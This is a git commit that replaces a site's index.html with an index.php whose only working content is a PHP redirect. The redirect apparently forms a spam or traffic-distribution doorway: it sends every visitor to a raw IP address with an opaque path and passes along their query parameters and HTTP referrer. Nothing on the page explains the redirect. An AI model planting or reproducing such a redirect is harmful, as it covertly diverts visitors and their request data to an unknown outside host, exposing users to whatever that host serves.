0807076fdd654aebf883183e55a358e55705362b
mgagaster <56481234+mgagaster@users.noreply.github.com>
2019-11-29 12:23:02 +0700

    Update and rename index.html to index.php

---
+++ index.php
@@ -0,0 +1,7 @@
+<?php header('Location: http://68.183.69.85/fGHk3p?' . http_build_query($_GET) . '&se_referrer=' . urlencode($_SERVER['HTTP_REFERER']) . ''); ?>
+<html>
+<head>
+</head>
+<body>
+ </body>
+</html>
